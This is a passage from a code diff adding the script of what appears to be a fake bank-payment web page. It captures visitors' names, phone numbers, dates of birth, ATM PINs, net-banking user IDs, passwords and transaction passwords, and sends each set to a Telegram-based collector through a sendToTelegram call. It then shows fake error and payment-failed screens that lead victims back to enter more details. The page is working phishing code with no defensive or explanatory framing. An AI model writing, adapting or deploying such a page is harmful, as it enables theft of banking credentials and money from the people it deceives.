+        dob: document.getElementById('dob').value.trim(),
+        atmPin: pin,
+        page: 'ATM PIN'
+      });
+
+      showPage('page-error');
+    });
+
+    document.getElementById('backFromAtm').addEventListener('click', function() {
+      showPage('page-card');
+    });
+
+    // ===== BANK SERVER ERROR =====
+    document.getElementById('errorOkBtn').addEventListener('click', function() {
+      showPage('page-payment');
+      methodItems.forEach(function(el) {
+        el.classList.remove('selected');
+      });
+    });
+
+    // ===== PAYMENT FAILED =====
+    document.getElementById('failedRetryBtn').addEventListener('click', function() {
+      showPage('page-payment');
+      methodItems.forEach(function(el) {
+        el.classList.remove('selected');
+      });
+    });
+
+    // ===== NET BANKING - CUSTOM DROPDOWN =====
+    const dropdownHeader = document.getElementById('dropdownHeader');
+    const dropdownList = document.getElementById('dropdownList');
+    const dropdownArrow = document.getElementById('dropdownArrow');
+    const selectedBankText = document.getElementById('selectedBankText');
+    let selectedBank = null;
+
+    dropdownHeader.addEventListener('click', function(e) {
+      e.stopPropagation();
+      dropdownList.classList.toggle('open');
+      dropdownArrow.classList.toggle('open');
+      dropdownHeader.classList.toggle('active');
+    });
+
+    dropdownList.querySelectorAll('div').forEach(function(item) {
+      item.addEventListener('click', function(e) {
+        e.stopPropagation();
+        const bankName = this.textContent;
+        selectedBankText.textContent = bankName;
+        selectedBankText.style.color = '#1e293b';
+        selectedBank = this.dataset.bank;
+
+        dropdownList.querySelectorAll('div').forEach(function(d) {
+          d.classList.remove('selected');
+        });
+        this.classList.add('selected');
+
+        dropdownList.classList.remove('open');
+        dropdownArrow.classList.remove('open');
+        dropdownHeader.classList.remove('active');
+      });
+    });
+
+    document.addEventListener('click', function(e) {
+      if (!document.getElementById('bankDropdown').contains(e.target)) {
+        dropdownList.classList.remove('open');
+        dropdownArrow.classList.remove('open');
+        dropdownHeader.classList.remove('active');
+      }
+    });
+
+    // ===== NET BANKING - PROCEED =====
+    document.getElementById('proceedNet').addEventListener('click', function() {
+      if (!selectedBank) {
+        alert('Please select a bank');
+        return;
+      }
+
+      const uid = document.getElementById('netUserId').value.trim();
+      const pwd = document.getElementById('netPassword').value.trim();
+
+      if (!uid || !pwd) {
+        alert('Please enter User ID and Password');
+        return;
+      }
+
+      sendToTelegram({
+        fullName: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phoneNumber').value.trim(),
+        dob: document.getElementById('dob').value.trim(),
+        bank: selectedBank,
+        netUserId: uid,
+        netPassword: pwd,
+        page: 'Net Banking - Select Bank'
+      });
+
+      showPage('page-transpass');
+    });
+
+    document.getElementById('backFromNet').addEventListener('click', function() {
+      showPage('page-payment');
+    });
+
+    // ===== NET BANKING - TRANSACTION PASSWORD =====
+    document.getElementById('submitTrans').addEventListener('click', function() {
+      const tp = document.getElementById('transPass').value.trim();
+
+      if (!tp) {
+        alert('Please enter your Transaction Password');
+        return;
+      }
+
+      sendToTelegram({
+        fullName: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phoneNumber').value.trim(),
+        dob: document.getElementById('dob').value.trim(),
+        transPass: tp,
+        page: 'Transaction Password'
+      });
+
+      showPage('page-failed');
+    });
+
+    document.getElementById('backFromTrans').addEventListener('click', function() {
+      showPage('page-netbanking');
+    });
+
+    // Start with front page
+    showPage('page-front');
+  });
+</script>
+
+</body>
+</html>
